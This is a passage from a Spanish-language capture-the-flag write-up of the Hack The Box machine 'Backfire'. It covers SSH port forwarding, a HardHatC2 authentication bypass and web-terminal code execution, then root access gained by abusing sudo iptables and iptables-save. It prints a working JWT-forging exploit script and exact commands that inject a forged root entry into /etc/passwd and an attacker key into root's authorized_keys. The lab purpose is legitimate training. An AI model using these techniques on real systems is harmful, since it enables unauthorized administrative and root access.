             └─3755 /home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer

Warning: some journal files were not opened due to insufficient permissions.

ilya@backfire:/etc/systemd/system$ systemctl status hardhat_client
● hardhat_client.service - hardhat_client
     Loaded: loaded (/etc/systemd/system/hardhat_client.service; enabled; preset: enabled)
     Active: active (running) since Mon 2025-01-20 23:10:02 EST; 8min ago
   Main PID: 3697 (dotnet)
      Tasks: 42 (limit: 4602)
     Memory: 236.8M
        CPU: 12.884s
     CGroup: /system.slice/hardhat_client.service
             ├─3697 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
             └─3777 /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client

Warning: some journal files were not opened due to insufficient permissions.
```

Revisando el directorio `/etc/systemd/system`, nos encontramos con los archivos relacionados a `HardHat C2`.

```bash
ilya@backfire:/etc/systemd/system$ ls -l
total 40
lrwxrwxrwx 1 root root   45 Sep 27 16:43 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
drwxr-xr-x 2 root root 4096 Sep 27 16:36 getty.target.wants
-rw-r--r-- 1 root root  242 Sep 28 22:49 hardhat_client.service
-rw-r--r-- 1 root root  237 Sep 28 22:49 hardhat_server.service
-rw-r--r-- 1 root root  212 Sep 28 22:29 havoc.service
lrwxrwxrwx 1 root root   48 Sep 28 22:18 ip6tables.service -> /lib/systemd/system/netfilter-persistent.service
lrwxrwxrwx 1 root root   48 Sep 28 22:18 iptables.service -> /lib/systemd/system/netfilter-persistent.service
drwxr-xr-x 2 root root 4096 Dec 17 11:33 multi-user.target.wants
drwxr-xr-x 2 root root 4096 Sep 27 16:36 network-online.target.wants
drwxr-xr-x 2 root root 4096 Sep 27 16:43 open-vm-tools.service.requires
lrwxrwxrwx 1 root root   31 Sep 27 19:52 sshd.service -> /lib/systemd/system/ssh.service
drwxr-xr-x 2 root root 4096 Sep 27 16:43 sysinit.target.wants
drwxr-xr-x 2 root root 4096 Sep 27 16:43 timers.target.wants
lrwxrwxrwx 1 root root   41 Sep 27 16:43 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
-rw-r--r-- 1 root root  170 Sep 28 20:31 webserver.service
```

Investigamos sobre el contenido de estos archivos, por si tuvieran alguna configuración que nos pudiese aportar información. En este caso, nos indican la misma información obtenida anteriormente.

```bash
ilya@backfire:/etc/systemd/system$ cat hardhat_client.service
[Unit]
Description=hardhat_client

[Service]
User=sergej
WorkingDirectory=/home/sergej/HardHatC2
ExecStart=/home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
Restart=always

[Install]
WantedBy=multi-user.target
ilya@backfire:/etc/systemd/system$ cat hardhat_server.service
[Unit]
Description=hardhat_server

[Service]
User=sergej
WorkingDirectory=/home/sergej/HardHatC2
ExecStart=/home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release
Restart=always

[Install]
WantedBy=multi-user.target
ilya@backfire:/etc/systemd/system$ cat havoc.service
[Unit]
Description=havoc

[Service]
User=ilya
WorkingDirectory=/home/ilya/Havoc
ExecStart=/home/ilya/Havoc/havoc server --profile /home/ilya/files/havoc.yaotl
Restart=always

[Install]
WantedBy=multi-user.target
```

### SSH Port Forwarding to Share Internal Ports

Decidimos realizar **SSH Port Forwarding** para disponer de estos puertos en nuestro equipo local por los mismos puertos mencionados.

```bash
❯ ssh -L 127.0.0.1:5000:127.0.0.1:5000 -L 127.0.0.1:7096:127.0.0.1:7096 ilya@10.10.11.49
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Dec 17 11:30:51 2024 from 10.10.16.5
ilya@backfire:~$
```

Verificaremos que los puertos se encuentren abiertos en nuestro equipo local, es decir, que se haya realizado el **SSH Port Forwarding** correctamente.

```bash
❯ nmap -p- --open localhost
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 10:19 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000047s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
5000/tcp open  upnp
7096/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds
```

Desde nuestro navegador, probaremos de acceder a https://127.0.0.1:7096 y nos encontramos con el panel de inicio de sesión de `HardHat C2`.

<figure><img src="../../.gitbook/assets/imagen (205).png" alt="" width="563"><figcaption></figcaption></figure>

Si investigamos sobre la página [https://127.0.0.1:5000](https://127.0.0.1:5000), no encontramos ningún tipo de información.

<figure><img src="../../.gitbook/assets/imagen (206).png" alt=""><figcaption></figcaption></figure>

### HardHatC2 AuthN Bypass

Al investigar vulnerabilidades en HardHatC2, encontramos información sobre varias fallas en este framework.

{% embed url="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" %}

Por defecto, HardHatC2 genera automáticamente una contraseña para la cuenta **HardHat\_Admin**, la cual se muestra solo una vez al inicio. Sin embargo, el sistema utiliza una **clave estática de firma JWT** almacenada en `appsettings.json`, que permite a los atacantes generar tokens JWT válidos sin necesidad de autenticación.

Con esta vulnerabilidad, se puede usar el JWT para forjar un token y crear usuarios administradores sin necesidad de autenticarse.

Basándonos en el acceso a los puertos y en el archivo `.txt` inicial, donde se mencionaba que el framework había sido instalado con configuración por defecto, decidimos probar esta vulnerabilidad

{% code title="Bypass.py" %}
```python
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "gzzcoo",
  "role": "TeamLead",
  "username": "gzzcoo"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```
{% endcode %}

Al ejecutar el `Bypass.py`, verificamos que en un principio hemos logrado crear un usuario llamado `gzzcoo`.

```bash
❯ python Bypass.py
/home/kali/Desktop/HackTheBox/Linux/Backfire/content/Bypass.py:12: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
Generated JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiM2RlYjdhZTMtNDcwMC00ZGQ4LTkzMjUtYjI2ZmQ1Mjk0ZjQ2IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoiaGFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3Mzc0NDc4MjcsImV4cCI6MTczOTg2NzAyNywiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.hh6igOGH2iTKBfDc8XnwxF41Tq8nGB7VGMnif8xmADQ
/usr/local/lib/python3.12/dist-packages/urllib3/connectionpool.py:1099: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
User gzzcoo created
```

Probaremos de autenticarnos en el panel de `HardHat C2` y comprobamos que hemos logrado obtener el acceso correspondiente.

<figure><img src="../../.gitbook/assets/imagen (207).png" alt=""><figcaption></figcaption></figure>

### HardHatC2 Remote Code Execution (RCE)

En el mismo blog en el cual nos mencionaban diferentes vulnerabilidades, se nos informaba que una vez obtenido un usuario nuevo creado con permisos de Admin, podríamos llegar a explotar un Remote Code Execution (RCE).

Para ello, debeemos acceder a[https://127.0.0.1:7096/ImplantInteract](https://127.0.0.1:7096/ImplantInteract) y dispondremos de una opción llamada "Terminal·" en la cual podemos ejecutar comandos arbitrarios.

Al probar dicha funcionalidad, comprobamos que el usuario que ejecuta el comando se trata de `sergej`.

<figure><img src="../../.gitbook/assets/imagen (208).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Abusing sudoers privileges (iptables && iptables-save)

Revisando maneras de escalar nuestros privilegios para convertirnos en usuario`root`, nos encontramos que el usuario `sergej` dispone de permisos `sudoers` sobre `iptables && iptables-save`.

Realizando una bíusqueda en internet, nos encontramos con el siguiente blog que nos muestran un PoC de cómo elevar nuestros privilegios disponiendo de ambos permisos `sudoers` que dispone el usuario actual.

{% embed url="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" %}

<figure><img src="../../.gitbook/assets/imagen (209).png" alt=""><figcaption></figcaption></figure>

### Overwriting /etc/passwd to Add New Root User via sudoers (iptables & iptables-save)

En el PoC del blog mencionado, se nos informa que disponiendo de ambos permisos de `sudoers`, podemos intentar sobreescribir el archivo `/etc/passwd` para añadir una nueva entrada de un nuevo usuario `root` con una contraseña asignada por nosotros mismos.

En este caso, lo que realizaremos es copiar la entrada de nuestro `/etc/passwd` para tener la estructura de lo que deberemos añadir en el archivo de la máquina víctima.

Una vez tengamos la entrada de plantilla, lo que deberemos realizar es crear una contraseña en el formato de `OpenSSL`. Deberemos de reemplazar el valor `x` por el de la contreaseña generada, para lograr obtener el siguiente resultado --> _root:$1$Gow86CXS$sHAPSqpiT4xePLCPO147m1:0:0:root:/root:/bin/bash_

```bash
❯ catnp /etc/passwd | head -n 1
root:x:0:0:root:/root:/usr/bin/zsh

❯ openssl passwd Gzzcoo123
$1$Gow86CXS$sHAPSqpiT4xePLCPO147m1
```

Inyectaremos la entrada `root`falsificada en un nuevo comentario de regla de iptables, verificaremos que se encuentra añadida esta línea en las reglas de iptables y procederemos a sobreescribir el archivo `/etc/passwd` para añadir esta nueva entrada del usuario `root`.

En este caso, por x motivos no logramos sobreescribir el archivo mencionado, nos indica que la operación no está permitida.

```bash
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$1$Gow86CXS$sHAPSqpiT4xePLCPO147m1:0:0:root:/root:/bin/bash\n'

sudo /usr/sbin/iptables -S

sudo /usr/sbin/iptables-save -f /etc/passwd
```

<figure><img src="../../.gitbook/assets/imagen (210).png" alt=""><figcaption></figcaption></figure>

### **Overwriting /root/.ssh/authorized\_keys to Upload Our Public SSH Key via sudoers (iptables & iptables-save)**

Buscando otras maneras de aprovecharnos de estos privilegios de `sudoers`, pensamos en subir nuestra clave pública SSH al archivo `authorized_keys` del usuario `root.` En un principio no deberíamos tener problemas al ejecutar el `iptables && iptables-save` con permisos de `sudo`.

Copiaremos nuestra clave SSH pública que obtuvimos en los pasos anteriores.

```bash
❯ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali
```

Volveremos a realizar el PrivEsc aprovechándonos de estos permisos de `sudoers`. En este caso, crearemos un nuevo comentario que contenga nuestra clave SSH pública. Revisaremos que nos aparece el comentario en las reglas de `iptables`, y procederemos a sobreescribir el archivo mencionado.

```bash
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali\n'

sudo /usr/sbin/iptables -S

sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

<figure><img src="../../.gitbook/assets/imagen (211).png" alt=""><figcaption></figcaption></figure>

Al intentar acceder mediante SSH con el usuario `root`, comprobamos que no se solicita credenciales. Al subir nuestra clave pública SSH al archivo `/root/.ssh/authorized_keys`, logramos conectarnos sin necesidad de proporcionar una contraseña, ya que la clave pública almacenada en ese archivo se comunica directamente con nuestra clave privada.

Logramos acceso a la máquina como usuario `root` y verificamos la flag de **root.txt**.

```bash
❯ ssh root@10.10.11.49
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
root@backfire:~$ cat root.txt 
16ac29c65cc*********************
```
